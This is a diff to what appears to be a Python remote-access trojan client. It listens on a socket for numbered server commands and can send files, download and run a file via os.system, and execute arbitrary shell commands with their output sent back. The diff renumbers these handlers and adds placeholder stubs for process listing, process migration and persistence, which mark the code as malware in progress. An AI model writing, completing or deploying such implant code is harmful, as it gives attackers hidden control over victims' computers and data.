@@ -83,7 +83,11 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                     progBar.update(len(readBytes))
             print("File sent.")
 
-        elif int(cmd) == 5:  # download and execute
+        elif int(cmd) == 5: # TODO Return Process List
+            exit()
+
+
+        elif int(cmd) == 6:  # download and execute
             filepath = s.recv(BUFF_SIZE).decode()
             size = os.path.getsize(filepath)
             s.send(str(size).encode())
@@ -101,7 +105,7 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
 
             os.system(filepath)
 
-        elif int(cmd) == 6:  # run sys command, fails with a DIR command but works with ipconfig????
+        elif int(cmd) == 7:  # run sys command, fails with a DIR command but works with ipconfig????
             command = s.recv(BUFF_SIZE).decode()
             command = command.split()
             proc = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
@@ -109,3 +113,9 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             results = proc.communicate()[0]
             s.send(
                 results)  # results contains a bytes object with the output/stderr of the command run by subprocess.run
+
+        elif int(cmd) == 8: # TODO Process Migration (tentative)
+            exit()
+
+        elif int(cmd) == 9: # TODO Persistence
+            exit()
